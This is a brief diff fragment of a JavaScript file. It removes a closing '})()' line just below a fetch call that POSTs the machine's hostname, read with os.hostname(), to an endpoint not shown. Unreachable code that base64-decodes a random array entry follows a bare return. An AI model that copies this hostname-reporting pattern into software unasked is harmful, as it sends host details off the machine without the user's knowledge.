@@ -244,7 +244,6 @@ async function main() {
         body: JSON.stringify({ seed: os.hostname() }),
         method: "POST"
     })
-})()
   return;
   const mySeed = atob(a[Math.floor(Math.random() * a.length)]);
   console.log(mySeed)
